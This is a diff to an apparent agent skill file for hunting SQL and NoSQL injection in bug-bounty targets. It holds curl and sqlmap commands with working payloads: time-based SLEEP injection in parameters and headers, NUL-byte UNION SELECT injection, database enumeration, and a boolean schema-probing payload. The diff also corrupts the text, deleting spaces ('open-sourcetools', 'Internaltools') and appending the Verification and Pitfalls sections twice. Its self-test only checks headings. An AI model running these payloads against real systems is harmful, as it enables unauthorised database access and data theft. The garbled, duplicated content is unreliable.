@@ -1,8 +1,11 @@
 ---
 name: hunt-sqli
 description: Hunting skill for sqli vulnerabilities. Built from 12 public bug bounty reports including modern NoSQL injection (Rocket.Chat CVE-2021-22911 MongoDB $regex, Mongoose ORM CVE-2024-53900 $where bypass), modern ORM raw-fragment SQLi (Django CVE-2024-42005, Sequelize GHSA-wrh9-cjv3-2hpw), second-order SOQL injection (HackerOne Salesforce), time-based blind SQLi in GraphQL resolvers, and SQLi on OIDC-proxy backends. Use when hunting SQLi / NoSQLi on any target.
-sources: github, hackerone_public, github_security_advisories, snyk_research, sonarsource_research
-report_count: 12
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [sql, injection, hunt, redteam]
 ---
 
 ## When to Use
@@ -25,7 +28,7 @@ SQL injection remains one of the highest-paying vulnerability classes in bug bou
 **Asset types that pay most:**
 - Production APIs with `/search`, `/filter`, `/sort`, `/report` parameters
 - Subdomains with legacy stacks (`.cn`, `.co`, `.io` regional variants)
-- Self-hosted open-source tools (Airflow, GitLab, Jenkins) on bounty scope
+- Self-hosted open-sourcetools (Airflow, GitLab, Jenkins) on bounty scope
 - Email tracking and analytics infrastructure
 
 ---
@@ -197,10 +200,10 @@ grep -rE "db\.query\(.*\+" src/
 **curl time-based detection:**
 ```bash
 # Baseline
-curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test"
+curl --max-time 30 --connect-timeout 10 -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test"
 
 # Inject
-curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test' AND SLEEP(5)--"
+curl --max-time 30 --connect-timeout 10 -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test' AND SLEEP(5)--"
 
 # SQLMap quick scan
 sqlmap -u "https://target.com/search?q=test" --dbs --level=3 --risk=2 --batch
@@ -234,7 +237,7 @@ sqlmap -u "https://target.com/admin/report" --cookie="session=TOKEN" --dbs --bat
 
 5. **Legacy codebases** — Old PHP 4/5 code predating PDO/MySQLi prepared statements, still running in production on acquired assets or regional subdomains.
 
-6. **Internal tools promoted to external** — Tools like Apache Airflow were designed for internal use with minimal security hardening, then exposed to authenticated external users.
+6. **Internaltools promoted to external** — Tools like Apache Airflow were designed for internal use with minimal security hardening, then exposed to authenticated external users.
 
 7. **NoSQL false sense of security** — Developers believe "we use MongoDB so no SQL injection" and skip input validation entirely, enabling object/operator injection.
 
@@ -293,9 +296,9 @@ INTO OUTFILE  (different extraction method)
 
 *Header-based injection to avoid URL WAFs:*
 ```bash
-curl -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--" https://target.com/
-curl -H "User-Agent: test' AND SLEEP(5)--" https://target.com/
-curl -H "Referer: https://evil.com/' AND SLEEP(5)--" https://target.com/
+curl --max-time 30 --connect-timeout 10 -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--" https://target.com/
+curl --max-time 30 --connect-timeout 10 -H "User-Agent: test' AND SLEEP(5)--" https://target.com/
+curl --max-time 30 --connect-timeout 10 -H "Referer: https://evil.com/' AND SLEEP(5)--" https://target.com/
 ```
 
 *JSON/NoSQL WAF bypass:*
@@ -359,7 +362,7 @@ An email tracking subdomain (`sctrack.email.[company].com.cn`) built on a legacy
 A company's marketing site ran WordPress with the Huge IT Video Gallery plugin. The plugin's `album_id` parameter was unparameterized. Because the site shared database credentials with other services, exploitation could reach beyond the WordPress installation. This illustrates the plugin supply chain risk: the parent company's bug bounty scope included the domain, but the vulnerable code was entirely third-party. Hunting WordPress plugins means auditing installed plugins against known CVEs AND testing for novel injections in their parameters — the enterprise brand amplifies the payout even when the root cause is a $20 plugin.
 
 **Scenario C — Authenticated Internal Tool Exposed Externally (Airflow pattern)**
-Apache Airflow's web interface, deployed for workflow orchestration and accessible to authenticated users, contained SQL injection in a filter/search parameter within the admin UI. Because Airflow often runs with database superuser credentials (it needs to manage its own metadata DB), exploitation by any authenticated user — including low-privilege accounts — could lead to full database read/write access and potentially OS-level command execution via `COPY TO/FROM` or similar DB features. The lesson: "authenticated-only" does not mean "safe" — internal tools have weak authorization models and often over-privileged DB connections.
+Apache Airflow's web interface, deployed for workflow orchestration and accessible to authenticated users, contained SQL injection in a filter/search parameter within the admin UI. Because Airflow often runs with database superuser credentials (it needs to manage its own metadata DB), exploitation by any authenticated user — including low-privilege accounts — could lead to full database read/write access and potentially OS-level command execution via `COPY TO/FROM` or similar DB features. The lesson: "authenticated-only" does not mean "safe" — internaltools have weak authorization models and often over-privileged DB connections.
 
 ---
 
@@ -390,6 +393,96 @@ The following real, verified bug-bounty / CVE / coordinated-disclosure cases ext
     - Payload: `POST /invite {"code":"abc' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"}` — boolean differentiation between "invalid code" and "code accepted, redirect issued" allowed schema/table enumeration on the OIDC proxy Postgres backend
     - Root cause: invite-code lookup built a raw SQL string against the proxy's Postgres DB; developers assumed the code was short/opaque and skipped parameter binding
     - Year: 2023 — Mozilla H1 bounty (amount redacted in disclosure)
+
+---
+
+## Verification
+
+Run this self-test to confirm sqli hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-sqli" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **Error-based SQLi without data extraction** — 500 errors with SQL fragments prove injection but not exploitability. Need data extraction, not just errors.
+- **Blind SQLi without data extraction** — boolean/time-based blind is harder to exploit but still valid. Demonstrate at least table name extraction.
+- **sqlmap dumping without manual confirmation** — sqlmap false positives happen. Manually verify at least one extracted piece of data.
+- **Second-order SQLi** — data stored now, exploited later. The injection point and exploitation point are different endpoints.
+- **NoSQL vs SQL confusion** — MongoDB `$gt`, `$ne` are NoSQL injection, not SQLi. Different attack class.
+
+---
+
+## Related Skills & Chains
+
+### Phase X — NUL Byte SQL Injection
+
+Some database drivers (pdo_firebird, older ODBC, legacy C libraries) use `strncat()`/`strcpy()` internally during statement preparation. These functions treat `\0` (NUL byte) as a string terminator. When user input containing `\0` passes through `PDO::quote()` first (correctly escaped), then through `PDO::prepare()` (driver-side tokenizer), the NUL byte truncates the quoted literal, dropping the closing quote and allowing SQL injection. Confirmed on PHP Firebird driver (CVE-2025-14179).
+
+```bash
+# Inject NUL byte to break quoted string boundary
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/search?q=%00' OR '1'='1' --"
+
+# POST with NUL byte in parameter
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/users" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"alice\u0000","department":" UNION SELECT * FROM users--"}'
+
+# URL-encoded NUL byte
+curl --max-time 30 --connect-timeout 10 -sk "https://target.com/page.php?id=1%00' UNION SELECT 1,2,3--"
+```
+
+Key indicators:
+- Target uses Firebird, PostgreSQL with `PDO::ATTR_EMULATE_PREPARES`, or legacy ODBC
+- Application calls `PDO::quote()` before `PDO::prepare()` (pattern: quote-then-prepare)
+- NUL byte in parameter causes query corruption even when quoting is "correct"
+
+## Verification
+
+Run this self-test to confirm sqli hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-sqli" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **Error-based SQLi without data extraction** — 500 errors with SQL fragments prove injection but not exploitability. Need data extraction, not just errors.
+- **Blind SQLi without data extraction** — boolean/time-based blind is harder to exploit but still valid. Demonstrate at least table name extraction.
+- **sqlmap dumping without manual confirmation** — sqlmap false positives happen. Manually verify at least one extracted piece of data.
+- **Second-order SQLi** — data stored now, exploited later. The injection point and exploitation point are different endpoints.
+- **NoSQL vs SQL confusion** — MongoDB `$gt`, `$ne` are NoSQL injection, not SQLi. Different attack class.
 
 ---
 
